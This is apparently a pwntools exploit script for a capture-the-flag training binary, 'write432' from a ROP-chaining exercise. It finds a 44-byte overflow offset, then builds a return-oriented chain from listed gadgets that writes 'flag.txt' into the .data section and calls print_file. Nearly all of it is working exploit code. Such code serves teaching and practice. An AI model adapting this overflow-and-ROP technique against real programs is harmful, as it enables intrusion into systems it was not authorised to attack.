import sys

from pwn import *
from rich import print

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# break
# b *0x0804874e
b main
continue
b *0xf7fbb74e
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './write432'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
# context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

if False:
    io = start()
    io.sendlineafter('> ', cyclic(400, n=4))

    io.wait_for_close()
    core =io.corefile

    print(core.sp)
    print(hex(core.sp))
    # print(core.read(core.sp, 4))
    print(core.pc, 4)
    info("-----------------------")
    # info("%s", cyclic_find(core.read(core.sp, 4), n=4))
    info("%s", cyclic_find(core.pc, n=4))
    info("-----------------------")

    sys.exit()

offset=44


# binsh_offset = next(elf.search(b'/bin/cat'))

rop = ROP(elf)

# ➜  (venv)  write4_32 git:(master) ✗ ropper --nocolor --file ./write432 | fzf
# 0x080485aa: pop edi; pop ebp; ret;

# ropper --nocolor --file ./write432 | fzf
# ➜  (venv)  write4_32 git:(master) ✗ ropper --nocolor --file ./write432 | fzf
# 0x08048543: mov dword ptr [edi], ebp; ret;


# print(elf.symbols)

# ➜  (venv)  write4_32 git:(master) ✗ readelf -S write432
  # [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
print(hex(elf.symbols.data_start))  # 0x804a018

rop.raw([0x080485aa, 0x804a018,   'flag', 0x08048543])
rop.raw([0x080485aa, 0x804a018+4, '.txt', 0x08048543])
rop.print_file(0x804a018)

# sys.exit()


# info("%s", rop.dump())
# sys.exit()

PAYLOAD = flat({
    offset: [
        # b'AAAA',
        rop.chain(),
    ]
})


io = start()
io.sendlineafter(b'>', PAYLOAD)
io.clean()
# io.interactive()
# io.wait_for_close()
